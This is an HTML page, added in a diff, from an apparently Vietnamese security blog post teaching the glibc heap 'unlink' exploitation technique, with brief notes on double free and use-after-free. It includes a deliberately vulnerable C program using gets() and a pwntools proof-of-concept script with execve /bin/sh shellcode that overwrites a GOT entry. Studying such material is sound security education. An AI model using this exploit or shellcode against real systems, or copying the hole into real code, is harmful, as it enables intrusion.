@@ -1,0 +1,450 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Unlink Technique - HarDToBelieve's Blog</title>
+  <meta name="author" content="HarDToBelieve">
+
+  
+  <meta name="description" content="Unlink Technique written in exploitation Ở bài này, ta sẽ nghiên cứu một kỹ thuật rất mạnh dùng để khai thác lỗ hổng ở vùng nhớ heap. Cấu trúc heap &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hardtobelieve.github.io/blog/2016/05/15/unlink-technique">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="HarDToBelieve's Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+
+</head>
+
+  <body>
+    <a href="/" class="home-icon">
+      <img src="/images/home.png"/>
+    </a>
+
+    <article role="article" class="full-single-article">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-10 col-md-offset-1">
+        <h1>Unlink Technique</h1>
+        <div class="meta">
+          written 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2016-05-15T10:34:31+07:00" pubdate data-updated="true"></time>
+          
+
+in
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/exploitation/'>exploitation</a>
+  
+</span>
+
+
+        </div>
+        <p>Ở bài này, ta sẽ nghiên cứu một kỹ thuật rất mạnh dùng để khai thác lỗ hổng ở vùng nhớ heap.</p>
+
+<!--more-->
+
+
+<h1>Cấu trúc heap</h1>
+
+<p>Glibc tổ chức 1 heap chunk như sau</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
+</span><span class='line'>  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>         <span class="cm">/* double links -- used only if free. */</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Only used for large blocks: pointer to next larger size.  */</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd_nextsize</span><span class="p">;</span> <span class="cm">/* double links -- used only if free. */</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk_nextsize</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thông thường sau khi malloc, nếu ta dump heap ra thì sẽ chỉ thấy 2 thành phần là <code>prev_size</code> và <code>size</code>. 2 thành phần chính còn lại là fd và bk sẽ xuất hiện sau khi ta free.</p>
+
+<p><img src="/assets/unlink/heap_before_free.png" alt="Trước khi free" /></p>
+
+<ul>
+<li>Prev_size: Nếu heapchunk liền trước không đc sử dụng, trường này sẽ chứa size của heapchunk đó. Còn nếu heapchunk trước đang được sử dụng, prev_size sẽ chứa dữ liệu từ người dùng</li>
+<li>size: Trường size không những thể hiện kích thước của heap, mà còn chứa thêm 3 thông tin tương ứng với 3 bit cuối cùng:
+
+<ul>
+<li>PREV_INUSE(P): Bit P bằng 1 khi chunk trước được dùng và bằng 0 khi chunk trước không được dùng</li>
+<li>IS_MAPPED(M): Bit M bằng 1 khi địa chỉ của chunk được mmap</li>
+<li>NON_MAIN_ARENA(N): Bit N bằng 1 khi chunk thuộc thread arena (?)</li>
+</ul>
+</li>
+</ul>
+
+
+<p><img src="/assets/unlink/heap_after_free.png" alt="Sau khi free" /></p>
+
+<ul>
+<li>Prev_size: Lúc này prev_size sẽ luôn chứa dữ liệu người dùng từ heapchunk trước đó, vì glibc không cho phép 2 chunk liên tiếp đều ở trạng thái đã bị free</li>
+<li>size: Vẫn giữ nguyên khi chưa free</li>
+<li>fd: Trường fd chứa địa chỉ của chunk kế tiếp trong cùng 1 bin ( Bin là 1 danh sách các chunks đã được free, sẽ được nói đến trong 1 bài riêng )</li>
+<li>bk: Trường bk chứa địa chỉ của chunk liền trước trong cùng 1 bin</li>
+</ul>
+
+
+<h1>Unlink trong free()</h1>
+
+<p>Thao tác unlink được glibc định nghĩa là:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define unlink(AV, P, BK, FD) {</span>
+</span><span class='line'>    <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
+</span><span class='line'>            <span class="o">&amp;&amp;</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>                <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>              <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span>
+</span><span class='line'>                               <span class="s">&quot;corrupted double-linked list (not small)&quot;</span><span class="p">,</span>
+</span><span class='line'>                               <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="n">P</span><span class="p">)</span>
+</span><span class='line'>                  <span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span><span class='line'>                <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+</span><span class='line'>                    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span><span class='line'>                    <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span><span class='line'>                    <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span><span class='line'>                  <span class="p">}</span>
+</span><span class='line'>              <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+</span><span class='line'>              <span class="p">}</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Khi ta gọi hàm free(), về cơ bản chương trình sẽ thực hiện các thao tác sau:</p>
+
+<ul>
+<li>Kiểm tra một số điều kiện về kích thước</li>
+<li>Kiểm tra liệu có chunk liền sau chunk hiện tại và size của nó chứa thông tin chỉ ra rằng chunk hiện tại đang được sử dụng</li>
+<li>Kiểm tra chunk hiện tại có nằm ở đầu freelist hay không</li>
+<li>Kiểm tra chunk liền trước có phải cũng đang ở trạng thái free không</li>
+<li>Nếu có, thực hiện thao tác unlink chunk đó vào nhập 2 chunk làm 1</li>
+<li>Nối lại chunk sau khi đã nhập làm 1 vào freelist</li>
+</ul>
+
+
+<p>Ta có thể thấy thao tác unlink có thể giúp ta có được quyền viết vào một vùng bất kỳ</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
+</span><span class='line'><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Tuy nhiên, muốn làm được vậy, ta phải bypass qua điều kiện kiểm tra của glibc. Ta sẽ xét ví dụ cụ thể sau</p>
+
+<h1>Kịch bản ( Heap overflow )</h1>
+
+<p>Giả sử ta có</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">list_addr</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Good bye!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Chương trình sẽ yêu cầu hàm malloc một vùng nhớ là 0x80, vì giá trị này nằm ở giữa small bin và large bin (Sẽ được nói đến trong 1 bài riêng), từ đó khi thực hiện các thao tác trong lúc free sẽ đơn giản hơn.
+Dễ thấy rằng ta có thể viết đè từ chunk1 sang chunk2 nhờ hàm gets(), từ đó sau khi free chunk2, ta sẽ làm cho hàm free sát nhập chunk1 vào chunk2 mặc dù chunk1 đang ở trong trạng thái được sử dụng. Đầu tiên, hàm free() sẽ kiểm tra bit PREV_INUSE(P) của chunk2</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* consolidate backward */</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">prevsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
+</span><span class='line'>      <span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trước khi unlink chunk1 để sát nhập, hàm free có một bước kiểm tra để khẳng định chunk liền trước và liền sau chunk1 đang trỏ vào chunk1</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Tuy nhiên, trước đó chương trình dùng 1 biến toàn cục để chứa địa chỉ của các heapchunk đã malloc nên ta có thể dựa vào đây để bypass qua câu lệnh if này. Ta cần lưu ý ở đây, vì khi free, chương trình sử dụng địa chỉ thực của heapchunk chứ không phải địa chỉ trả về cho người dùng, nên khi tạo các thông tin giả, ta phải tạo cách địa chỉ trả về ít nhất 2 blocks tương ứng với prev_size và size của chunk1, ta gọi là chunk11</p>
+
+<p>Tổng kết lại, ta cần thực hiện các bước sau:</p>
+
+<ul>
+<li>Bit P của chunk2 phải được gán bằng 0 để báo với hàm free() rằng chunk11 đã được free trước đó</li>
+<li>Trường fd của chunk11 sẽ chứa địa chỉ của ô nhớ cách nơi lưu địa chỉ các heapchunk 3 blocks (12 bytes)</li>
+<li>Trường bk của chunk11 sẽ chứa địa chỉ của ô nhớ cách nới lưu địa chỉ các heapchunk 2 blocks (8 bytes)</li>
+<li>prev_size của chunk2 phải chứa size của chunk11</li>
+</ul>
+
+
+<h1>Proof of concept</h1>
+
+<p>Sau khi unlink được thì có thể có nhiều cách để khai thác tiếp: viết đè EIP, sử dụng fini_array, tls_dtor_list&hellip; Để đơn giản, bài viết sẽ khai thác bằng cách viết đè lên bảng GOT để trỏ vào nơi chứa shellcode.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">1928</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">heap_addr</span> <span class="o">=</span> <span class="mh">0x0804b000</span>
+</span><span class='line'><span class="n">list_addr</span> <span class="o">=</span> <span class="mh">0x0804a030</span>
+</span><span class='line'><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x0804a018</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">block_size</span> <span class="o">=</span> <span class="mi">4</span>
+</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\</span>
+</span><span class='line'><span class="se">\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">2</span><span class="o">*</span><span class="n">block_size</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">list_addr</span> <span class="o">-</span> <span class="mi">3</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">list_addr</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">11</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">17</span><span class="o">*</span><span class="n">block_size</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x89</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">3</span><span class="o">*</span><span class="n">block_size</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mi">6</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/assets/unlink/before.png" alt="Trước khi nhập payload" /></p>
+
+<p><img src="/assets/unlink/before2.png" alt="Trước khi free" /></p>
+
+<p><img src="/assets/unlink/after.png" alt="Sau khi free" /></p>
+
+<ul>
+<li>Ưu điểm: Có thể viết bất kỳ nơi đâu mà không làm hỏng vùng nhớ ở đó</li>
+<li>Nhược điểm: Thông thường chương trình phải có nơi lưu lại địa chỉ của các heapchunk</li>
+</ul>
+
+
+<h1>Double free</h1>
+
+<p>Đây là lỗi khi mà hàm free() thực hiện thao tác free đối vs 1 đối tượng 2 lần. Về cơ bản, thao tác tạo chunk giả để unlink cũng giống với heap overflow, nhưng kịch bản ở đây sẽ khác:</p>
+
+<ul>
+<li>Malloc chunk1 có kích thước 0x80</li>
+<li>Malloc chunk2 có kích thước 0x80</li>
+<li>Free chunk2 và chunk1</li>
+<li>Malloc chunk3 có kích thước 0x100</li>
+<li>Tạo chunk1 giả và chunk2 giả trong lòng chunk3</li>
+<li>Free chunk2</li>
+</ul>
+
+
+<h1>User after free</h1>
+
+<p>Đây là lỗi khi một vùng nhớ đã được free rồi nhưng ta vẫn có thể lưu dữ liệu ta nhập vào đó. Kịch bản tương tự với Heap overflow</p>
+
+
+        <hr class="divider-short"/>
+
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<hr class="divider-short"/>
+
+<div class="archive-link">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        
+          <a class="pull-left" href="/blog/2016/03/24/house-of-force/" title="Previous Post: House of force">&laquo; Previous: House of force</a>
+        
+
+        
+          <a class="pull-right" href="/blog/2016/05/15/the-forgotten-chunk/" title="Next Post: The Forgotten Chunk">Next: The Forgotten Chunk &raquo;</a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    <footer id="footer" class="her-row">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-1">
+  <a href="/"><h4>Home</h4></a>
+</div>
+
+<div class="col-md-2">
+  <div class="social-icon-list">
+    
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+<div class="pull-right">
+  <h4>Powered by <a href="http://octopress.org/">Octopress</a>. Designed by <a href="http://AdrianArtiles.com">Adrian Artiles</a>.</h4>
+</div>
+
+
+    </div>
+  </div>
+</footer>
+
+    
+  </body>
+</html>
